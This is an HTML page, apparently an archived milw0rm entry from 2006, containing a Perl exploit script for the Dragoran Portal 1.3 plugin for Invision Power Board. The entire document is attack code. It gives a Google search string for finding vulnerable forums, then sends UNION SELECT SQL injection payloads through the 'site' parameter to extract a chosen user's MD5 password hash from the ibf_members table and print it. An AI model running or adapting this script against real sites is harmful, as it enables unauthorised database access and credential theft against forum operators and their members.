<html><head><title>Invision Power Board Dragoran Portal Mod <= 1.3 SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
###########################################
#IPB Portal 1.3-&gt;Invision Power Board plugin
#Created By SkOd
#SED security Team , http://sed-team.be
###########################################
#google:
#&quot;Portal 1.3 by Dragoran&quot;
###########################################



use IO::Socket;
if (@ARGV &lt; 3){
print q{
############################################################
#      IPB Portal 1.3 SQL injection Get Hash Exploit       #
#          Tested on Invision Power Board 1.3.0		   #
#	    created By SkOd. SED Security Team             #
############################################################
	ipbpro.pl [HOST] [PATH] [Target id]
	  ipbpro.pl www.host.com /forum/ 2 
############################################################
};
exit;
}
$serv = $ARGV[0];
$dir = $ARGV[1];
$id = $ARGV[2];


$serv =~ s/(http:\/\/)//eg;
$path = $dir.'index.php?act=portal&amp;site=-999%20UNION%20SELECT%20substring(password,1,10),substring(password,11,20),substring(password,21,30)%20FROM%20ibf_members%20Where%20id='.$id.'/*';
$path2 = $dir.'index.php?act=portal&amp;site=-999%20UNION%20SELECT%20substring(password,31,32),null,null%20FROM%20ibf_members%20Where%20id='.$id.'/*';
$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$serv&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-]Connect Failed\r\n&quot;;

print &quot;[+]Connecting...\n&quot;;
print $socket &quot;GET $path HTTP/1.1\n&quot;;
print $socket &quot;Host: $serv\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
print &quot;[+]Connected\n&quot;;
print &quot;[+]User ID: $id\n&quot;;
print &quot;[+]MD5 Hash: &quot;;
while ($answer = &lt;$socket&gt;)
{
$answer =~ s/40%//eg;
$answer =~ s/30%//eg;
$answer =~ m/valign=&quot;top&quot; width=&quot;(.*?)&quot;/ &amp;&amp; print &quot;$1&quot;;
}

$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$serv&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-]Exploit Failed\r\n&quot;;
print $socket &quot;GET $path2 HTTP/1.1\n&quot;;
print $socket &quot;Host: $serv\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;

while ($answer = &lt;$socket&gt;)
{
$answer =~ s/40%//eg;
$answer =~ s/30%//eg;
$answer =~ m/valign=&quot;top&quot; width=&quot;(.*?)&quot;/ &amp;&amp; print &quot;$1&quot;;
}

# milw0rm.com [2006-01-31]</pre></html>